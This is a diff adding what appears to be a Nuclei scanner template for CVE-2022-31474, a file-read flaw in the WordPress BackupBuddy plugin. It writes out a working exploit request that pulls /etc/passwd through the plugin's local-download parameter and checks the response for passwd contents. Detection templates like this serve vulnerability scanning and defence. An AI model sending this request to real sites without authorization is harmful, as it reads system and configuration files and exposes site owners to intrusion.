@@ -1,0 +1,31 @@
+id: CVE-2022-31474
+info:
+  name: WordPress Plugin BackupBuddy Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress BackupBuddy plugin versions 8.5.8.0 to 8.7.4.1 have an information disclosure vulnerability stemming from an arbitrary file read and download vulnerability. Attackers can exploit this issue to read sensitive files such as configuration files.
+  reference:
+    - https://packetstormsecurity.com/files/168292/WordPress-BackupBuddy-8.7.4.1-Arbitrary-File-Read.html
+  classification:
+    cve-id: CVE-2022-31474
+    cvss-score: 7.5
+
+variables:
+  file_path: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=wp-config&local-download={{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
